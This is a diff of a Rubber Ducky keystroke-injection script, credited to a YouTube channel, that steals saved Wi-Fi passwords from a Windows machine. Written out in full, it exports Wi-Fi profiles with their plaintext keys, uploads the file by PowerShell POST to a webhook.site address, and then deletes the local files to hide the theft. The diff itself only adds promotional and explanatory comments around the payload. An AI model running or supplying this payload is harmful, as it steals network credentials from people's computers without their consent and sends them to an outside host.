@@ -1,3 +1,7 @@
+REM Ducky Script for Steal Saved WiFi Password
+REM Author - TechChip
+REM https://github.com/techchipnet
+REM https://youtube.com/techchipnet
 DELAY 500
 GUI r
 DELAY 1000
@@ -15,6 +19,8 @@ STRING powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > WiFi-K
 ENTER
 DELAY 1000
 DELAY 500
+REM next command will post wifi password on webhook.site
+REM watch demo on techchip youtube channel
 STRING powershell Invoke-WebRequest -Uri https://webhook.site/<paste webhook unique id here> -Method POST -InFile WiFi-Key
 ENTER
 STRING del Wi* /s/f/q
@@ -22,3 +28,4 @@ ENTER
 DELAY 500
 STRING exit
 ENTER
+REM Subscribe techchip youtube channel
